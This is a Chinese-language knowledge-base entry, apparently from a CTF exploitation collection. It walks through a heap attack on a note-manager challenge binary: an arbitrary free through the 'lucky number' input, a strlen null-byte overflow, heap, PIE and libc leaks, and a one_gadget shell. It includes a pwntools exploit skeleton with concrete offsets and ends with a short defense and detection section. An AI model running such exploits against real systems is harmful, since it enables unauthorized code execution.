---
id: binary-pwn-heap-xor-chunklist-lucky-number-arbitrary-free-uaf
title: XOR 编码堆指针 + lucky number 任意 free：strlen 空字节截断制造 note 重叠，泄露 PIE/heap/libc 后 one_gadget
type: scenario
domain: binary
path: binary/pwn/heap
technique: xor-chunklist-lucky-number-arbitrary-free
tags:
- pwn
- heap
- xor-pointer
- arbitrary-free
- uaf
- strlen
- null-byte
- pie-leak
- glibc-2.39
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T13:34:25+08:00'
  notes: 已对照原文 ez_heap 全文与图 16-24 核对：XOR 0x111111111111111、delete lucky number、strlen 前导空字节绕过 15 字节、heap/PIE 泄露公式、lucky number=main 重置、free@GOT 0x3f48 泄 libc、one_gadget 0xef52b 均与 EXP 一致；未在本机复跑
url: /docs/binary/pwn/heap/binary-pwn-heap-xor-chunklist-lucky-number-arbitrary-free-uaf/
draft: false
kb_aliases:
- lucky number 任意 free
- XOR 编码堆指针
- strlen 空字节截断溢出
- note 管理器 UAF
- 重新执行 main 重置次数
- free_got 泄露 libc
---

## 一句话结论

note 管理器把堆块指针以 `chunk ^ key` 编码后与 `heapList` 一起放在 BSS，delete 又用用户输入的 “lucky numbers” 解码并释放指针，导致攻击者可控制释放目标；同时 edit 用 `strlen` 检查 name 长度，前导 `\x00` 使长度被截断为 0 却仍拷贝 15 字节，溢出相邻 note 结构造成两个 note 共享内容块；结合重新进入 main 重置一次性 show/edit 限制，可依次泄露 heap、PIE、libc 并把 lucky number 改成 one_gadget 拿 shell。

## 原理

- **编码指针存储**：每条 note 结构里保存 `name_size`、`content_size`、`name`、`heapaddr ^ dest` 等字段，其中堆地址与某个目的值异或后存储，`heapList[idx]` 位于 BSS。show 时把编码值按同样规则解码后读取内容。
- **lucky number 控制释放目标**：delete 要求输入 “lucky numbers”，用它解码/校验待释放指针；程序没有验证该数字是否与原始分配匹配，攻击者可以指定一个让解码结果指向任意地址的数字，从而 free 任意指针（如 main 地址、GOT、one_gadget），或制造悬空/重复释放。
- **strlen 截断绕过长度检查**：edit 读取新 name 后用 `strlen(name)` 得到长度并与 15 比较；若 name 以 `\x00` 开头，`strlen` 返回 0，检查通过，但后续按固定长度拷贝 15 字节，覆盖相邻 note 结构的 name/content 字段。
- **重叠内容块**：溢出把第二个 note 的 content 指针改成与第一个 note 相同/相邻，两个 note 指向同一内容块，形成 UAF/重叠读写；show 一个 note 即可读出另一个 note 的编码指针，恢复 heap 基址与 BSS 上的 `heapList` 地址（PIE 基址）。
- **重置一次性限制**：程序对 show/edit 有使用次数限制；把 lucky number 设为 main 地址可让 delete 走到重新执行 main 的路径，重置计数后再次利用。
- **泄露 libc 与最终劫持**：把某个 note 的 content 指针改到 `free@GOT`，show 读出 free 的真实地址得到 libc 基址；最后把 lucky number 改成 one_gadget 地址，delete 触发 free 链跳到 one_gadget。

## 触发条件

- 目标为 x86-64 note/堆管理器，指针以 XOR 形式存储且 BSS 中有可读的 `heapList`。
- delete 的 “lucky numbers” 参与指针解码/释放且缺少与原始分配的一致性校验。
- edit 的 name 长度检查使用 `strlen`，允许前导空字节绕过。
- 程序有 show 功能且存在一次性使用限制，但可重新进入 main 重置。
- 已能泄露/推算 XOR 密钥或目的值，且目标 libc 版本已知（用于 one_gadget/GOT 偏移）。

## 利用步骤

1. 创建若干 note（如 6 个），记录它们的编号与内容大小；删除一个 note 后用 add 复用，观察编码指针与 `heapList` 布局。
2. 对目标 note 执行 edit，name 传 `b'\x00' + b'a'*0xf`：`strlen` 返回 0 绕过长度检查，15 字节覆盖相邻 note 的 name/content 字段，使两个 note 的内容块重叠。
3. show 重叠 note，读取被覆盖的编码指针；用已知 XOR 规则恢复 heap 基址，并从 BSS 指针泄露 PIE 基址。
4. 把 lucky number 设为 main 地址，触发 delete 的重新执行路径，回到 “game with me?” 重新进入 main，重置 show/edit 次数。
5. 再次 edit 把某个 note 的 content 指针改成 `free@GOT`，show 读出 free 地址，计算 libc 基址。
6. 把 lucky number 设为 one_gadget 地址，执行 delete；程序按 lucky number 解码/释放并跳转，触发 one_gadget。
7. 按目标 one_gadget 约束准备栈/寄存器（必要时先做一次 `ret` 对齐）。

## PoC

关键 payload 骨架（编号、密钥与偏移按目标调整；原文 EXP 已打通并拿到 shell）：

```python
xor = 0x111111111111111
# 过人机验证
p.sendlineafter(b'game with me?', b'admin:' + p64(xor) + b':Junior:111111')

# 删除 0 号后重新 add，形成可复用的编码指针
delete(key, 0, b'1')
add(key, b'1', b'8', b'h'*0x10)

# 前导 NUL 绕过 strlen，15 字节覆盖相邻 note
edit(0x11111111, 7, b'\x00' + b'a'*0xf)
show(0x11111111, 7)
heap_base = ((u64(p.recv(7).ljust(8, b'\x00')) << 8) ^ xor) >> 12 << 12
proc_base = u64(p.recvuntil(b'\n').ljust(8, b'\x00')) - 0x4080 - 0x7*8 - 0xa000000000000

# lucky number 设为 main，重新进入 main 重置次数
delete(key, 1, str(proc_base + 0x1cc7))
p.sendlineafter(b'game with me?', b'admin:' + p64(xor) + b':Junior:111111')

# 把内容指针改到 free@GOT，show 泄露 libc
edit(0x11111111, 0, b'\x00' + b'a'*0xf + p64((proc_base + 0x3f48) ^ xor))
show(0x11111111, 0)
free_addr = u64(p.recvuntil(b'\n').ljust(8, b'\x00')) - 0xa000000000000
libc.address = free_addr - libc.sym['free']

# lucky number 设为 one_gadget，delete 触发
delete(key, 1, str(libc.address + 0xef52b))
```

## 变体与关联

- 变体：XOR 密钥/目的值可从 show 的编码指针或 BSS 初始化值推断；若密钥每次随机，需要先泄露密钥。
- 变体：把任意 free 目标改为 `__free_hook`（旧 glibc）、`_IO_list_all` 或栈返回地址，配合 ROP/FSOP。
- 变体：若 name 长度检查改用 `strnlen` 或复制长度与检查长度一致，需寻找其它溢出点（content size、索引越界）。
- 关联：[[binary-pwn-heap-uaf-function-pointer-hijack]]（UAF 回调劫持）、[[binary-pwn-heap-custom-arena-double-free-cookie-arbitrary-alloc]]（自定义编码 freelist 与任意分配）、[[binary-pwn-heap-pack-stale-cap-oob-note-struct-function-pointer]]（note 结构越界改写函数指针）。

## 检测与防御

- 防御：指针编码不能替代边界检查；delete 必须校验索引、lucky number 与原始分配记录一致；name 长度用 `strnlen` 并确保拷贝长度与检查长度一致。
- 防御：show/edit 的一次性限制不能作为安全边界；重新进入 main 时应重置所有状态并清零堆表。
- 检测：监控 free 参数不在堆范围、同一指针重复 free、note 内容指针指向 GOT/BSS、以及 `strlen` 前导空字节后的大长度拷贝。
- 分析：先恢复 note 结构与 `heapList` 布局，确认 XOR 编码规则，再用 show 逐步验证 heap/PIE/libc 泄露，不要直接照搬偏移。
- 该场景为 CTF/授权测试利用。
